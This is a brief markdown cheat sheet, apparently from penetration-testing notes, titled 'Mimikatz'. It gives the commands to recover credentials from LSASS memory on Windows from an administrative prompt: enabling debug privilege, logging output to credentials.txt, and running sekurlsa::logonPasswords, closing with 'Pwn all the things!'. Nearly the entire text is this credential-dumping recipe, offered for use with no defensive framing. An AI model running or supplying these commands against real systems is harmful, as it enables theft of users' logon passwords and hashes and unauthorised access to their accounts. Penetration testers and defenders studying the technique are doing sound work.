# Mimikatz

## Recovering LSASS
```
Open an Administrative prompt
mimikatz.exe # privilege::debug
mimikatz(commandline) log credentials.txt
mimikatz(commandline) sekurlsa::logonPasswords
Pwn all the things!
```